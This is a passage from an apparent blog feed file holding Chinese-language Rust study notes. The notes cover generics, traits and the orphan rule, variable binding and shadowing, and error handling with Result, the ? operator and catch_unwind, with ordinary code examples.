punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们声明了一个常量泛型usize，这个usize可以放到入参处切片的类型中去，这便是常量泛型的用法。</p><h3 id="泛型的性能"><a href="#泛型的性能" class="headerlink" title="泛型的性能"></a>泛型的性能</h3><blockquote><p>在 Rust 中泛型是零成本的抽象，意味着你在使用泛型时，完全不用担心性能上的问题。</p><p>但是任何选择都是权衡得失的，既然我们获得了性能上的巨大优势，那么又失去了什么呢？Rust 是在编译期为泛型对应的多个类型，生成各自的代码，因此损失了编译速度和增大了最终生成文件的大小。</p><p>具体来说：</p><p>Rust 通过在编译时进行泛型代码的 <strong>单态化</strong>(<em>monomorphization</em>)来保证效率。单态化是一个通过填充编译时使用的具体类型，将通用代码转换为特定代码的过程。</p><p>编译器所做的工作正好与我们创建泛型函数的步骤相反，编译器寻找所有泛型代码被调用的位置并针对具体类型生成代码。</p></blockquote><h2 id="特征-trait"><a href="#特征-trait" class="headerlink" title="特征(trait)"></a>特征(trait)</h2><p>其实对应的就是java的interface，不过似乎设计得更好</p><h3 id="定义特征"><a href="#定义特征" class="headerlink" title="定义特征"></a>定义特征</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">trait</span> <span class="token class-name">Summary</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span><span class="token punctuation">;</span>        <span class="token comment">// 允许有默认实现</span>    <span class="token comment">// 默认实现中允许调用其他方法</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>        <span class="token string">"巴拉巴拉"</span> <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">summarize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="为类型实现特征"><a href="#为类型实现特征" class="headerlink" title="为类型实现特征"></a>为类型实现特征</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">trait</span> <span class="token class-name">Summary</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Post</span> <span class="token punctuation">{</span>    <span class="token keyword">pub</span> title<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// 标题</span>    <span class="token keyword">pub</span> author<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// 作者</span>    <span class="token keyword">pub</span> content<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// 内容</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span> <span class="token keyword">for</span> <span class="token class-name">Post</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>        <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"文章{}, 作者是{}"</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>title<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>author<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Weibo</span> <span class="token punctuation">{</span>    <span class="token keyword">pub</span> username<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    <span class="token keyword">pub</span> content<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span> <span class="token keyword">for</span> <span class="token class-name">Weibo</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>        <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"{}发表了微博{}"</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样的设计让Rust实现Kotlin那样的拓展函数成为可能。</p><h3 id="孤儿原则"><a href="#孤儿原则" class="headerlink" title="孤儿原则"></a>孤儿原则</h3><blockquote><p>上面我们将 <code>Summary</code> 定义成了 <code>pub</code> 公开的。这样，如果他人想要使用我们的 <code>Summary</code> 特征，则可以引入到他们的包中，然后再进行实现。</p><p>关于特征实现与定义的位置，有一条非常重要的原则：<strong>如果你想要为类型 <code>A</code> 实现特征 <code>T</code>，那么 <code>A</code> 或者 <code>T</code> 至少有一个是在当前作用域中定义的！</strong>。例如我们可以为上面的 <code>Post</code> 类型实现标准库中的 <code>Display</code> 特征，这是因为 <code>Post</code> 类型定义在当前的作用域中。同时，我们也可以在当前包中为 <code>String</code> 类型实现 <code>Summary</code> 特征，因为 <code>Summary</code> 定义在当前作用域中。</p><p>但是你无法在当前作用域中，为 <code>String</code> 类型实现 <code>Display</code> 特征，因为它们俩都定义在标准库中，其定义所在的位置都不在当前作用域，跟你半毛钱关系都没有，看看就行了。</p><p>该规则被称为<strong>孤儿规则</strong>，可以确保其它人编写的代码不会破坏你的代码，也确保了你不会莫名其妙就破坏了风马牛不相及的代码。</p></blockquote><h3 id="形参约束"><a href="#形参约束" class="headerlink" title="形参约束"></a>形参约束</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">notify</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Breaking news! {}"</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span><span class="token function">summarize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 多重约束</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">notify</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span> <span class="token operator">+</span> <span class="token class-name">Display</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span class="token comment">// 不使用where约束</span><span class="token keyword">fn</span> <span class="token function-definition function">some_function</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">Display</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token punctuation">:</span> <span class="token class-name">Clone</span> <span class="token operator">+</span> <span class="token class-name">Debug</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>t<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">,</span> u<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">U</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">i32</span> <span class="token punctuation">{</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span class="token comment">// 使用where约束</span><span class="token keyword">fn</span> <span class="token function-definition function">some_function</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>t<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">,</span> u<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">U</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">i32</span>    <span class="token keyword">where</span> <span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">Display</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span>          <span class="token class-name">U</span><span class="token punctuation">:</span> <span class="token class-name">Clone</span> <span class="token operator">+</span> <span class="token class-name">Debug</span><span class="token punctuation">{</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>虽然 <code>impl Trait</code> 这种语法非常好理解，但是实际上它只是一个语法糖：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">notify</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">Summary</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Breaking news! {}"</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span><span class="token function">summarize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>// TODO</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Rust学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust笔记其一</title>
      <link href="/2022/05/19/rust-note-1/"/>
      <url>/2022/05/19/rust-note-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Rust笔记其一"><a href="#Rust笔记其一" class="headerlink" title="Rust笔记其一"></a>Rust笔记其一</h1><h2 id="变量绑定"><a href="#变量绑定" class="headerlink" title="变量绑定"></a>变量绑定</h2><blockquote><p>在其它语言中，我们用 <code>var a = "hello world"</code> 的方式给 <code>a</code> 赋值，也就是把等式右边的 <code>"hello world"</code> 字符串赋值给变量 <code>a</code> ，而在 Rust 中，我们这样写： <code>let a = "hello world"</code> ，同时给这个过程起了另一个名字：<strong>变量绑定</strong>。</p><p>为何不用赋值而用绑定呢（其实你也可以称之为赋值，但是绑定的含义更清晰准确）？这里就涉及 Rust 最核心的原则——<strong>所有权</strong>，简单来讲，任何内存对象都是有主人的，而且一般情况下完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（聪明的读者应该能猜到，在这种情况下，该对象之前的主人就会丧失对该对象的所有权），像极了我们的现实世界，不是吗？</p><p>摘自 《Rust Course》</p></blockquote><h2 id="解构语法"><a href="#解构语法" class="headerlink" title="解构语法"></a>解构语法</h2><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Struct</span> <span class="token punctuation">{</span>    e<span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token comment">// 数组解构</span>    <span class="token keyword">let</span> <span class="token punctuation">[</span>c<span class="token punctuation">,</span><span class="token punctuation">..</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>_<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 结构体解构</span>    <span class="token keyword">let</span> <span class="token class-name">Struct</span> <span class="token punctuation">{</span> e<span class="token punctuation">,</span> <span class="token punctuation">..</span> <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token class-name">Struct</span> <span class="token punctuation">{</span> e<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="变量遮蔽-shadowing"><a href="#变量遮蔽-shadowing" class="headerlink" title="变量遮蔽(shadowing)"></a>变量遮蔽(shadowing)</h2><p>Rust 允许声明相同的变量名，在后面声明的变量会遮蔽掉前面声明的，如下所示：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token comment">// 在main函数的作用域内对之前的x进行遮蔽</span>    <span class="token keyword">let</span> x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">{</span>        <span class="token comment">// 在当前的花括号作用域内，对之前的x进行遮蔽</span>        <span class="token keyword">let</span> x <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"The value of x in the inner scope is: {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"The value of x is: {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="类型推导"><a href="#类型推导" class="headerlink" title="类型推导"></a>类型推导</h2><p>个人感觉比较类似kt的类型推导吧，要么声明变量类型，要么指定泛型</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">except</span><span class="token punctuation">(</span><span class="token string">"Not a number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 报错，无法推断你想要parse的类型</span><span class="token keyword">let</span> guess<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">except</span><span class="token punctuation">(</span><span class="token string">"Not a number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// √</span><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Not a number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// √</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>rust的泛型还要打::，挺怪，但能接受。</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><blockquote><h2 id="Rust-的错误哲学"><a href="#Rust-的错误哲学" class="headerlink" title="Rust 的错误哲学"></a>Rust 的错误哲学</h2><p>错误对于软件来说是不可避免的，因此一门优秀的编程语言必须有其完整的错误处理哲学。在很多情况下，Rust 需要你承认自己的代码可能会出错，并提前采取行动，来处理这些错误。</p><p>Rust 中的错误主要分为两类：</p><ul><li><strong>可恢复错误</strong>，通常用于从系统全局角度来看可以接受的错误，例如处理用户的访问、操作等错误，这些错误只会影响某个用户自身的操作进程，而不会对系统的全局稳定性产生影响</li><li><strong>不可恢复错误</strong>，刚好相反，该错误通常是全局性或者系统性的错误，例如数组越界访问，系统启动时发生了影响启动流程的错误等等，这些错误的影响往往对于系统来说是致命的</li></ul><p>很多编程语言，并不会区分这些错误，而是直接采用异常的方式去处理。Rust 没有异常，但是 Rust 也有自己的卧龙凤雏：<code>Result&lt;T, E&gt;</code> 用于可恢复错误，<code>panic!</code> 用于不可恢复错误。</p><p>摘自 《Rust Crouse》</p></blockquote><p>我们可以直接使用<code>panic!</code>来抛出一个异常，让程序直接崩溃，但一般我们不会这么做。一般我们会大量的使用<code>Result</code>来进行异常的传递，毕竟Rust里是没有try catch的，而我们抛出异常的目的一般不会是直接让整个程序崩溃，而是要让其他人去处理这个异常。</p><p>讲真，我觉得rust的异常处理设计得简直一级棒，比go和java的不知道高到哪里去了，kotlin的Result API也不过是是对其拙劣的模仿（暴论）~</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// expect 如产生错误 直接panic!</span><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Not a number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 比较类似go的异常处理方式，不过语法更加好看</span><span class="token comment">// 不过这种方式写多了会造成多层嵌套</span><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">match</span> guess <span class="token punctuation">{</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"You guessed: {}"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">Err</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Error: {}"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，为了避免模板代码，rust有一个<code>?</code>的语法糖，可以在返回值为Result的函数中使用</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span></span>time<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token punctuation">{</span><span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token class-name">OpenOptions</span><span class="token punctuation">,</span> thread<span class="token punctuation">,</span> <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Write</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> f <span class="token operator">=</span> <span class="token class-name">OpenOptions</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"hello.txt"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span> <span class="token comment">// &lt;-</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"{:?} \n"</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// on the moment, manually remove the file hello.txt</span>    <span class="token keyword">let</span> ten_millis <span class="token operator">=</span> <span class="token namespace">time<span class="token punctuation">::</span></span><span class="token class-name">Duration</span><span class="token punctuation">::</span><span class="token function">from_millis</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">thread<span class="token punctuation">::</span></span><span class="token function">sleep</span><span class="token punctuation">(</span>ten_millis<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"{:?} \n"</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> r <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">write_all</span><span class="token punctuation">(</span><span class="token string">b"Hello, world!"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"Result is {:?} \n"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">drop</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个<code>?</code>对应的模板代码如下</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> f <span class="token operator">=</span> <span class="token class-name">OpenOptions</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token keyword">mut</span> f <span class="token operator">=</span> <span class="token keyword">match</span> f<span class="token punctuation">{</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> file<span class="token punctuation">,</span>    <span class="token class-name">Err</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如此便大幅简化了开发流程，实属厉害</p><p>那么，rust有没有办法捕获异常呢</p><p>有</p><blockquote><p>最后，再来说个例外，<code>panic::catch_unwind</code>。</p><p>先看下它的用法：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>panic<span class="token punctuation">;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token namespace">panic<span class="token punctuation">::</span></span><span class="token function">catch_unwind</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">assert!</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token namespace">panic<span class="token punctuation">::</span></span><span class="token function">catch_unwind</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">{</span>    <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">"oh no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">assert!</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没错，它的行为几乎就是try/catch了：panic！宏被捕获了，程序并也没有挂，返回了Err。尽管如此，Rust的目的并不是让它成为try/catch机制的实现，而是当Rust和其他编程语言互动时，避免其他语言代码块throw出异常。所以呢，错误处理的正道还是用<strong>Result</strong>。</p><p>从catch_unwind的名字上，需要留意下unwind这个限定词，它意味着只有默认进行栈反解的panic可以被捕获到，如果是设为直接终止程序的panic，就逮不住了。</p><p>细节可进一步参考<a href="https://link.zhihu.com/?target=https://doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html">Rust Documentation</a>。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Rust学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022暑假学习计划</title>
      <link href="/2022/05/18/learning-plan-of-summer-vacation/"/>
      <url>/2022/05/18/learning-plan-of-summer-vacation/</url>
      
